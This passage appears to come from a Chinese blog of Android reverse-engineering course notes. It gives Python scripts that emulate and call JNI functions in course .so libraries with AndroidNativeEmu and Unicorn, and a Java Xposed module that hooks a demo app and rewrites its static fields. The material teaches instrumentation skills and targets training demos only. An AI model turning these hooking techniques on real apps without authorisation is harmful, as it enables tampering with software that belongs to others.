id="第六课时">第六课时</h2><p><strong>AndroidNativeEmu调用JNI函数</strong></p><p>在项目中给的基础上修改就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#实现打印字符串</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_method标签</span></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>):</span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#进行hook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;strlen&#x27;</span>, emulator.hooker.write_function(strlen) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;_Z4testv&#x27;</span>, emulator.hooker.write_function(_Z4testv) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#emulator.load_library(&quot;example_binaries/32/libc.so&quot;, do_init=False)</span></span><br><span class="line"><span class="comment">#lib_module = emulator.load_library(&quot;example_binaries/32/libnative-lib.so&quot;, do_init=False)</span></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/unicorncourse06.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add debugging.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    instruction = uc.mem_read(address, size)</span><br><span class="line">    instruction_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;&#123;:02x&#125; &#x27;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> instruction)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;# Tracing instruction at 0x%x, instruction size = 0x%x, instruction = %s&#x27;</span> % (address, size, instruction_str))</span><br><span class="line"></span><br><span class="line"><span class="comment">#emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Runs a method of &quot;libnative-lib.so&quot; that calls an imported function &quot;strlen&quot; from &quot;libc.so&quot;.</span></span><br><span class="line"><span class="comment">#emulator.call_symbol(lib_module, &#x27;_Z4testv&#x27;) #运行这个函数</span></span><br><span class="line">funcname=<span class="string">&#x27;Java_com_example_unicorncourse04_MainActivity_stringFromJNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#两种调用方式，类比frida</span></span><br><span class="line">result=emulator.call_symbol(lib_module, <span class="string">&#x27;Java_com_example_unicorncourse04_MainActivity_stringFromJNI&#x27;</span>,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&quot;testjnifunction&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;second--------------------------------&quot;</span>)</span><br><span class="line">result=emulator.call_native(lib_module.base+<span class="number">0x0b58</span>+<span class="number">1</span>,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&quot;testjnifunction&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第七课时">第七课时</h2><p>AndroidNativeEmu模拟JNIOnLoad动态注册jni函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#实现打印字符串</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_method标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_class_def <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> debug_utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create java class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/MainActivity&quot;</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;stringFromJNI&#x27;</span>, signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringFromJNI</span>(<span class="params">self, uc,arg0</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>): <span class="comment">#一个参数</span></span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>): <span class="comment">#没有参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/unicorncourse07.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line">emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#两种调用方式，类比frida</span></span><br><span class="line">emulator.java_classloader.add_class(MainActivity)  <span class="comment">#模拟器注册  加载类</span></span><br><span class="line"><span class="comment">#JNIOnLoda中进行动态注册</span></span><br><span class="line">emulator.call_symbol(lib_module, <span class="string">&#x27;JNI_OnLoad&#x27;</span>, emulator.java_vm.address_ptr, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#利用动态注册地址调用Jni函数 方法一</span></span><br><span class="line">address=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> method <span class="keyword">in</span> MainActivity.jvm_methods.values():</span><br><span class="line">    <span class="keyword">if</span> method.name==<span class="string">&quot;stringFromJNI&quot;</span>:</span><br><span class="line">        address=method.native_addr  <span class="comment">#获取指定函数注册地址</span></span><br><span class="line">    logger.info(<span class="string">&quot;Registered JNI method--&gt;name:&quot;</span>+method.name+<span class="string">&quot;--signature:&quot;</span>+method.signature+<span class="string">&quot;--address&quot;</span>+method.native_addr)</span><br><span class="line">result=emulator.call_native(address,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#实例调用jni函数 方法二</span></span><br><span class="line"><span class="comment">#mainactivity=MainActivity()#创建实例</span></span><br><span class="line"><span class="comment">#result=mainactivity.stringFromJNI(emulator,&#x27;i am from python&#x27;) #调用实例下面的函数</span></span><br><span class="line"><span class="comment">#print(result)</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#jni函数中出现对java函数的调用</span></span><br></pre></td></tr></table></figure><p>AndroidNativeEmu模拟与java函数交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#实现打印字符串</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_method标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_class_def <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> debug_utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create java class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;stringFromJNI&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringFromJNI</span>(<span class="params">self, uc,arg0</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#java函数 需要指定参数类型 args_list</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encrypt</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/Encrypt&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;base64&#x27;</span>,  args_list=[<span class="string">&#x27;jstring&#x27;</span>],signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">False</span></span>) </span><span class="comment">#不是jni函数 native是false</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64</span>(<span class="params">self,*args, **kwargs</span>):  <span class="comment">#通过args打印参数</span></span><br><span class="line">        content=args[<span class="number">0</span>].value</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;base64 is called--&gt;&quot;</span>+content)</span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        encodestr=content.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        result=base64.b64encode(encodestr)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(result,<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#bytes --&gt; str</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>): <span class="comment">#一个参数</span></span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>): <span class="comment">#没有参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/calljava.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#两种调用方式，类比frida</span></span><br><span class="line">emulator.java_classloader.add_class(Encrypt)  <span class="comment">#模拟器注册  加载类</span></span><br><span class="line">emulator.java_classloader.add_class(MainActivity)  <span class="comment">#模拟器注册  加载类</span></span><br><span class="line">emulator.call_symbol(lib_module, <span class="string">&#x27;JNI_OnLoad&#x27;</span>, emulator.java_vm.address_ptr, <span class="number">0</span>) <span class="comment">#JNIOnLoda中进行动态注册</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用动态注册地址调用Jni函数 方法一</span></span><br><span class="line">address=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> method <span class="keyword">in</span> MainActivity.jvm_methods.values():</span><br><span class="line">    <span class="keyword">if</span> method.name==<span class="string">&quot;stringFromJNI&quot;</span>:</span><br><span class="line">        address=method.native_addr  <span class="comment">#获取注册地址</span></span><br><span class="line">    logger.info(<span class="string">&quot;Registered JNI method--&gt;name:&quot;</span>+method.name+<span class="string">&quot;--signature:&quot;</span>+method.signature+<span class="string">&quot;--address&quot;</span>+method.native_addr)</span><br><span class="line">result=emulator.call_native(address,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#实例调用jni函数 方法二</span></span><br><span class="line">mainactivity=MainActivity()<span class="comment">#创建实例</span></span><br><span class="line">result=mainactivity.stringFromJNI(emulator,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"> <span class="comment">#jni函数中出现对java函数的调用</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>Xposed框架</h1><h2 id="一-Hook修改静态变量">一.Hook修改静态变量</h2><h3 id="目标：hook掉demo的静态变量tag，staticIntimage-20230714120304119">目标：hook掉demo的静态变量tag，staticInt<img src="assets/image-20230714120304119.png" alt="image-20230714120304119"></h3><h3 id="代码实现如下">代码实现如下</h3><p>因为xposed是个框架，所以整体框架不会太大变化，主要就是写回调函数handleLoadPackage方法里的东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//XposedBridge.log(TAG+&quot;|&quot;+&quot;我抓到你了:&quot;+loadPackageParam.packageName);</span></span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticIntField(clazz,<span class="string">&quot;staticInt&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Log.d()：输出一些内容，用来标志Start Hook…</li><li>loadPackageParam.packageName.equals(‘包名’)：hook到的包与所给包名相比较。这里就是如果是自己想要的包，就过滤出这个包，并进行下面的操作。</li><li>XposedHelpers.findClass(String className, ClassLoader classLoader):获取该类</li><li>XposedHelpers.setStaticIntField(Class&lt;?&gt; clazz, String fieldName, int value)：修改静态int变量</li><li>XposedHelpers.setStaticObjectField(Class&lt;?&gt; clazz, String fieldName, Object value):修改静态String变量</li></ul><h3 id="生成模块">生成模块</h3><ol><li>点击，生成apk<br><img src="assets/image-20230714123338943.png" alt="image-20230714123338943"></li><li>把生成的apk拖入模拟器,进入Xposed框架，激活模块，软重启。</li></ol><h3 id="执行结果">执行结果</h3><ul><li><p>安装app，因为我拖动安装说不被允许测试，使用命令 adb install -t app.apk安装</p></li><li><p>打开demo app<br><img src="assets/image-20230714124021025.png" alt="image-20230714124021025"></p></li><li><p>进行过滤：<img src="assets/image-20230714122629300.png" alt="image-20230714122629300"></p></li><li><p>执行demo<br><img src="assets/image-20230714122801050.png" alt="image-20230714122801050"></p></li><li><p>结果<br><img src="assets/image-20230714123145948.png" alt="image-20230714123145948"></p></li></ul><h2 id="二-Hook构造函数">二.Hook构造函数</h2><h3 id="目标：hook掉demo的构造函数image-20230714181704240">目标：hook掉demo的构造函数<img src="assets/image-20230714181704240.png" alt="image-20230714181704240"></h3><h3 id="代码实现如下-2">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 